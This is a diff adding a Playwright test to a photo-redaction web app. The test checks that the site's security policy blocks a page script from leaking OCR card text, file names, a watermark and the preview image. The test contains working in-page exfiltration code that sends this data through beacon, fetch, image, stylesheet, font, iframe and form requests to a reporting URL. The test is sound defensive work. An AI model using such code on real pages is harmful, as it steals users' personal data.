@@ -7,7 +7,8 @@
 // any script from another origin runs in the app's page, if the app's page sends anything out, or if
 // the counter frame can reach the app's page.
 import { expect, test, type BrowserContext, type Page, type Request } from '@playwright/test'
-import { controlled, toEditor } from './helpers.ts'
+import { NAMES, WATERMARK, canariesIn } from './canaries.ts'
+import { controlled, toEditor, toEditorWithText } from './helpers.ts'
 import { STATS_URL } from '../../src/analytics/stats-frame.ts'
 
 test.use({ locale: 'es-ES', baseURL: 'https://dnitapado.es/' })
@@ -203,6 +204,49 @@ test('the audit attack fails: a substitute beacon cannot be loaded or send the p
   expect(fromApp(traffic)).toEqual([])
   // The counter frame reported once, from the start screen, before any photo, and without a photo.
   for (const s of traffic.sent.filter((x) => x.url.startsWith(REPORT))) expect(s.body).not.toMatch(/data:image/)
+})
+
+test('page code that gathers file names, OCR text and the watermark cannot send them anywhere', async ({ browser }) => {
+  test.setTimeout(180_000)
+  // Under the service worker, as on the public site, so OCR runs (its worker gets its CSP there).
+  const context = await browser.newContext({ serviceWorkers: 'allow', locale: 'es-ES', baseURL: ROOT })
+  const page = await context.newPage()
+  const traffic = await asPublicSite(context)
+  await controlled(page)
+  // Fictional card text (read by OCR), canary file names, then smart find and a canary watermark.
+  await toEditorWithText(page, { names: NAMES })
+  await expect(page.locator('#find-run')).toBeEnabled({ timeout: 30_000 })
+  await page.locator('#find-run').click()
+  await expect(page.locator('#find-status')).toContainText(/Se han añadido \d+ recuadros/, { timeout: 150_000 })
+  await page.locator('#tool-mark').click()
+  await page.locator('#watermark').fill(WATERMARK)
+  const loot = await page.evaluate(async (report) => {
+    // What a script in the page could gather: the page text, every form value and the photos.
+    const values = [...document.querySelectorAll('input, textarea')].map((e) => (e as HTMLInputElement).value)
+    const text = [document.body.innerText, ...values, document.title, location.href].join('\n')
+    const png = (document.querySelector('#preview') as HTMLCanvasElement).toDataURL('image/png')
+    const payload = `${text}\n${png}`
+    const q = encodeURIComponent(text.slice(0, 1500))
+    // Every way out that needs no new script: beacon, fetch, image, style sheet, font, frame, form.
+    // eslint-disable-next-line no-restricted-properties -- this test checks that the browser blocks it
+    navigator.sendBeacon(report, payload)
+    await fetch(report, { method: 'POST', body: payload, mode: 'no-cors' }).catch(() => {})
+    const img = new Image(); img.src = `${report}?i=${q}`
+    const link = document.createElement('link'); link.rel = 'stylesheet'; link.href = `${report}?s=${q}`; document.head.append(link)
+    await new FontFace('x', `url(${report}?f=${q})`).load().catch(() => {})
+    const frame = document.createElement('iframe'); frame.src = `${report}?d=${q}`; document.body.append(frame)
+    const form = document.createElement('form'); form.method = 'post'; form.action = report; form.target = 'x'
+    const field = document.createElement('input'); field.name = 'd'; field.value = text; form.append(field); document.body.append(form)
+    try { form.submit() } catch {}
+    return text
+  }, REPORT)
+  // The data was there to steal: the watermark and the card text are in the page.
+  expect(canariesIn(loot).length).toBeGreaterThan(0)
+  await page.waitForTimeout(3000)
+  // Nothing left the app's page, and no request anywhere (counter frame included) carried a canary.
+  expect(fromApp(traffic)).toEqual([])
+  expect(traffic.sent.flatMap((s) => canariesIn(s.url, s.body))).toEqual([])
+  await context.close()
 })
 
 test.describe('counter frame (ADR 0024)', () => {
